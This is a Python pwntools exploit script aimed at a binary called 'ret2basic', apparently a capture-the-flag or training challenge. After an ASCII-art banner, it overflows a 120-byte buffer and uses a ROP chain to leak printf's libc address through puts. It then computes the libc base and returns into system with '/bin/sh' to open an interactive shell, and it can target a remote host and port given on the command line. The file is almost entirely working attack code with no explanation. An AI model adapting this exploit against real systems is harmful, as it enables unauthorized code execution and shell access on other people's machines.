#!/usr/bin/python3
from pwn import *
import sys

try:
    arg = sys.argv[1]
except:
    arg = "yok"

print("""
            ###             ###
            ###             ###
            ###             ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
    ####################################
    ####################################
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
        ###########################
        ###########################
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
                    ###
                    ###
                    ###
                    ###
""")


isim = "./ret2basic"
context.arch = "amd64"

if arg == "remote":
    p = remote(sys.argv[2], int(sys.argv[3]))
else:
    p = process(isim)


if arg == "debug":
    script = ""
    pid = gdb.attach(p.pid,script)

fn = "printf"

offset = b"A"*120
elf = ELF(isim,checksec=False)
rop = ROP(elf)
rop.call("puts", [ elf.got[fn] ])
rop.call("vuln")

payload = offset
payload += rop.chain()
p.read()
p.sendline(payload)
a = u64(p.readline().rstrip().ljust(8,b"\x00"))
p.read()
print(f"{fn} @ got: {hex(a)}")

delta = 0x64e10
base = a - delta

rdi = p64(0x4013c3)
ret = p64(0x4011cf)

sh = p64(base+0x1b75aa)
function = p64(base+0x55410)


ropchain = rdi + sh + ret + function
payload = offset
payload += ropchain
p.sendline(payload)

p.interactive()

